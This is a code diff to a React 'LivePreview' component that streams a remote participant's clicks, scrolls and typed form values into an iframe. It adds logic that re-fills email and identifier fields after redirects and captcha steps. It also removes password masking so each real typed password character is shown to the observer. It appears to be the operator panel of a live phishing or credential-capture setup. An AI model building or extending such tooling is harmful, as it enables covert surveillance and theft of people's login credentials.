@@ -27,18 +27,31 @@ function fitStage(w: number, h: number, maxLong: number) {
   };
 }
 
+function withObserve(url: string) {
+  try {
+    const u = new URL(url, window.location.origin);
+    u.searchParams.set("__observe", "1");
+    return u.pathname + u.search + u.hash;
+  } catch {
+    return url + (url.includes("?") ? "&" : "?") + "__observe=1";
+  }
+}
+
 export function LivePreview({
   pid,
   onClose,
   initial,
   initialUrl,
   initialViewport,
+  seedInputs,
 }: {
   pid: string;
   onClose: () => void;
   initial?: { pos: { x: number; y: number }; size: { w: number; h: number } };
   initialUrl?: string | null;
   initialViewport?: { w: number; h: number } | null;
+  /** Latest known field→value map so preview reseeds after redirects. */
+  seedInputs?: Record<string, string> | null;
 }) {
   const [url, setUrl] = useState<string>(initialUrl || "/");
   const [viewport, setViewport] = useState<{ w: number; h: number }>(
@@ -55,6 +68,16 @@ export function LivePreview({
   const rippleSeq = useRef(0);
   const keySeq = useRef(0);
   const lastValueRef = useRef<Record<string, string>>({});
+  const seedRef = useRef(seedInputs);
+  seedRef.current = seedInputs;
+
+  // Merge incoming seed props into the running field cache.
+  useEffect(() => {
+    if (!seedInputs) return;
+    for (const [k, v] of Object.entries(seedInputs)) {
+      if (typeof v === "string") lastValueRef.current[k] = v;
+    }
+  }, [seedInputs]);
 
   useEffect(() => {
     let alive = true;
@@ -75,6 +98,36 @@ export function LivePreview({
       void dbCh.unsubscribe();
     };
   }, [pid]);
+
+  function postToIframe(msg: Record<string, unknown>) {
+    const win = iframeRef.current?.contentWindow;
+    if (!win) return;
+    try {
+      win.postMessage({ __mirror: true, ...msg }, "*");
+    } catch {
+      /* ignore */
+    }
+  }
+
+  function reseedIframe() {
+    const fields = { ...lastValueRef.current, ...(seedRef.current || {}) };
+    // Prefer email under common aliases so chips/identity fill after nav.
+    const email =
+      fields.email ||
+      fields.email_submitted ||
+      fields.identifier ||
+      fields.Email ||
+      fields.Email_submitted;
+    if (email) {
+      fields.email = email;
+      fields.identifier = email;
+      fields.email_submitted = email;
+    }
+    for (const [field, value] of Object.entries(fields)) {
+      if (!field || value == null) continue;
+      postToIframe({ type: "live_input", field, value: String(value) });
+    }
+  }
 
   useEffect(() => {
     const cursorRef = { x: 0, y: 0, has: false };
@@ -100,20 +153,17 @@ export function LivePreview({
       const cy = p.y * viewport.h;
       const id = ++rippleSeq.current;
       setRipples((prev) => [...prev, { id, x: cx, y: cy }]);
-      setTimeout(() => setRipples((prev) => prev.filter((r) => r.id !== id)), 700);
-      const win = iframeRef.current?.contentWindow;
-      if (win) {
-        try {
-          win.postMessage({ __mirror: true, type: "click", x: cx, y: cy }, "*");
-        } catch {
-          /* ignore */
-        }
-      }
+      setTimeout(() => setRipples((prev) => prev.filter((r) => r.id !== id)), 500);
+      postToIframe({ type: "click", x: cx, y: cy });
+      // After UI toggles (captcha, show-password), re-apply typed values.
+      window.setTimeout(() => reseedIframe(), 50);
+      window.setTimeout(() => reseedIframe(), 400);
     }
 
     function onScrollEv(ev: Event) {
       const p = (ev as CustomEvent<ScrollPayload>).detail;
       if (p.id !== pid) return;
+      postToIframe({ type: "scroll", sx: p.sx, sy: p.sy });
       const win = iframeRef.current?.contentWindow;
       if (win) win.scrollTo({ left: p.sx, top: p.sy, behavior: "auto" });
     }
@@ -127,19 +177,10 @@ export function LivePreview({
     function onLiveInputEv(ev: Event) {
       const p = (ev as CustomEvent<LiveInputPayload>).detail;
       if (p.participantId !== pid) return;
-      const win = iframeRef.current?.contentWindow;
-      if (win) {
-        try {
-          win.postMessage(
-            { __mirror: true, type: "live_input", field: p.field, value: p.value },
-            "*",
-          );
-        } catch {
-          /* ignore */
-        }
-      }
-      const prev = lastValueRef.current[p.field] ?? "";
       lastValueRef.current[p.field] = p.value;
+      postToIframe({ type: "live_input", field: p.field, value: p.value });
+      const prev = lastValueRef.current[`__prev:${p.field}`] ?? "";
+      lastValueRef.current[`__prev:${p.field}`] = p.value;
       const cx = cursorRef.has ? cursorRef.x : viewport.w / 2;
       const cy = cursorRef.has ? cursorRef.y : viewport.h / 2;
       if (p.value.length > prev.length && p.value.startsWith(prev)) {
@@ -147,14 +188,14 @@ export function LivePreview({
         const ch = added.slice(-1);
         if (ch) {
           const id = ++keySeq.current;
-          const display = p.ftype === "password" ? "•" : ch;
-          setKeys((k) => [...k, { id, x: cx, y: cy, ch: display }]);
-          setTimeout(() => setKeys((k) => k.filter((x) => x.id !== id)), 900);
+          // Show the real character — password fields still mask via type=password.
+          setKeys((k) => [...k, { id, x: cx, y: cy, ch }]);
+          setTimeout(() => setKeys((k) => k.filter((x) => x.id !== id)), 600);
         }
       } else if (p.value.length < prev.length) {
         const id = ++keySeq.current;
         setKeys((k) => [...k, { id, x: cx, y: cy, ch: "⌫" }]);
-        setTimeout(() => setKeys((k) => k.filter((x) => x.id !== id)), 900);
+        setTimeout(() => setKeys((k) => k.filter((x) => x.id !== id)), 600);
       }
     }
 
@@ -193,10 +234,21 @@ export function LivePreview({
 
   const isPhone = viewport.w > 0 && viewport.h > viewport.w;
   const resLabel = `${viewport.w}×${viewport.h}`;
-  const iframeUrl = useMemo(
-    () => url + (url.includes("?") ? "&" : "?") + "__observe=1",
-    [url],
-  );
+  const iframeUrl = useMemo(() => withObserve(url), [url]);
+
+  // After each navigation remount, reseed identity + typed fields.
+  useEffect(() => {
+    const iframe = iframeRef.current;
+    if (!iframe) return;
+    function onLoad() {
+      // Give React pages a tick to mount listeners.
+      window.setTimeout(() => reseedIframe(), 60);
+      window.setTimeout(() => reseedIframe(), 250);
+      window.setTimeout(() => reseedIframe(), 700);
+    }
+    iframe.addEventListener("load", onLoad);
+    return () => iframe.removeEventListener("load", onLoad);
+  }, [iframeUrl]);
 
   if (typeof document === "undefined") return null;
 
@@ -232,6 +284,7 @@ export function LivePreview({
           }}
         >
           <iframe
+            key={iframeUrl}
             ref={iframeRef}
             title={`Live ${pid}`}
             src={iframeUrl}
